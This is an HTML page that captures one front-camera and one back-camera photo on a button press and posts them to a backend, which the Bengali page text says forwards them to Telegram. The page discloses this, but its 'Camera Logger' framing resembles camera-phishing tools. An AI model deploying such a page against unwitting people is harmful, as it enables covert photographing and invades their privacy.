<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Super Fast Camera Logger</title>
  <style>
    body {
      text-align: center;
      margin-top: 120px;
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      color: #333;
    }
    h2 { color: #222; margin-bottom: 30px; }
    p { max-width: 600px; margin: 0 auto 40px; color: #555; font-size: 18px; }
    button {
      padding: 18px 60px;
      font-size: 20px;
      cursor: pointer;
      border: none;
      border-radius: 10px;
      color: white;
      background: #007bff;
      transition: background 0.2s;
    }
    button:hover { background: #0062cc; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    #status {
      font-size: 17px;
      margin-top: 40px;
      color: #444;
      min-height: 30px;
    }
  </style>
</head>
<body>

  <h2>Super Fast Dual Camera Capture</h2>
  <p>বাটন ক্লিক করলেই front + back camera থেকে ২টা ছবি সাথে সাথে Telegram-এ চলে যাবে</p>

  <button id="captureBtn" onclick="captureBothCameras()">
    Front + Back Photo Send
  </button>

  <div id="status"></div>

  <script>
    const btn = document.getElementById('captureBtn');
    const status = document.getElementById('status');

    async function captureBothCameras() {
      btn.disabled = true;
      btn.textContent = "Capturing...";
      status.textContent = "";

      try {
        // Front camera photo
        status.textContent = "Front camera capturing...";
        const frontStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        const frontBase64 = await capturePhoto(frontStream);
        await sendPhoto(frontBase64, "front");

        // Back camera photo
        status.textContent = "Back camera capturing...";
        const backStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment" }
        });
        const backBase64 = await capturePhoto(backStream);
        await sendPhoto(backBase64, "back");

        status.textContent = "Both photos sent successfully ✅";
      } catch (err) {
        let msg = "Error: ";
        if (err.name === 'NotAllowedError') msg += "Camera permission denied";
        else if (err.name === 'NotFoundError') msg += "Camera not found";
        else msg += err.message;
        status.textContent = msg;
        console.error(err);
      } finally {
        btn.disabled = false;
        btn.textContent = "Front + Back Photo Send";
      }
    }

    async function capturePhoto(stream) {
      const video = document.createElement('video');
      video.srcObject = stream;
      await new Promise(r => { video.onloadedmetadata = r; });
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());
      return canvas.toDataURL('image/png');
    }

    async function sendPhoto(base64, type) {
      const res = await fetch("/api/send-photo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64, camera: type })
      });
      if (!res.ok) throw new Error("Send failed");
    }
  </script>
</body>
</html>
